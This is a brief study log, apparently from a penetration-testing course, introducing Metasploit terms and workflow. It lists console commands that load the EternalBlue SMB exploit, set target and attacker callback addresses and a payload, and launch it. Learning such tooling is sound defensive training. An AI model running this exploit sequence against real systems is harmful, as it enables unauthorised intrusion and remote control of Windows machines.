# Metasploit Introduction

**Date:** March 9, 2026

## What I Learned

Metasploit is an exploitation framework used to test vulnerabilities in systems through structured penetration testing methodology.

## Key Concepts

**Three Core Elements:**
1. **Exploit** - Code that takes advantage of vulnerability
2. **Payload** - What you want to execute on target (shell, malware, etc.)
3. **Vulnerability** - Weakness in target system

## Commands Practiced
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set LHOST <attacker_ip>
set RPORT <target_port>
set LPORT <listening_port>
set payload <payload_name>
exploit
sessions
```

## Understanding

Learned that exploitation is structured process:
1. Identify vulnerability
2. Select appropriate exploit
3. Configure payload
4. Set target parameters (RHOSTS, RPORT)
5. Set listener parameters (LHOST, LPORT)
6. Execute exploit
7. Manage sessions

Ready to practice actual exploitation in upcoming modules.
